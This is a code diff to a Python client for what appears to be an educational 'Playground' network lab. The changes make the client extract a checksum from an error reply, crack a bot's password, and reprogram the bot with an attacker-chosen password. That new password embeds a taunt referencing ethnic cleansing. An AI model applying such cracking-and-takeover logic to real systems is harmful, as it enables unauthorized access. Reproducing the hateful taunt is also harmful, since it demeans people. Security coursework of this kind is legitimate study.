@@ -18,7 +18,7 @@ from twisted.internet.endpoints import connectProtocol
 from playground.utils.ui import CLIShell, stdio
 from playground import playgroundlog
 
-import sys, os, traceback, getpass
+import sys, os, traceback, getpass, random
 try:
     import ProtocolStack
 except:
@@ -49,13 +49,24 @@ class ReprogrammingClientProtocol(Protocol):
             d = self.__requests[message.RequestId]
             d.callback(message.Data)
 
+            if (not self.__probes.has_key(message.RequestId)) or (not "mismatch" in data):
+                continue
             try:
+                print("")
+                print("Cracking password...")
                 checksum = data.split("Expected ")[1].split(" but got")[0]
                 req = self.__probes[message.RequestId]
                 req.Checksum = checksum
                 pw = crackRequestPW(req)
+                print("")
                 print("Password is %s" % pw)
-                self.reprogram(pw, "PASSWORD", "~EthnicClensisStan~Was~Here~123123123")
+                if pw:
+                    newpw = "~EthnicCleansisStan~Was~Here~%s" % random.randint(10000000000000000000,110000000000000000000)
+                    print("New password will be:")
+                    print(newpw)
+                    self.reprogram(pw, "PASSWORD", newpw)
+                else:
+                    print("Not reprogramming")
             except:
                 print("Error on password cracking")
 
@@ -121,6 +132,7 @@ class ReprogrammingShellProtocol(CLIShell):
         self.transport.write("Connected to Bot.\n")
         self.__protocol = protocol
         self.prompt = "[%s::%d] >>" % (self.__botAddress, self.__connectPort)
+        self.__checkStatus(None)
         
     def __reprogram(self, writer, *args):
         if not self.__protocol:
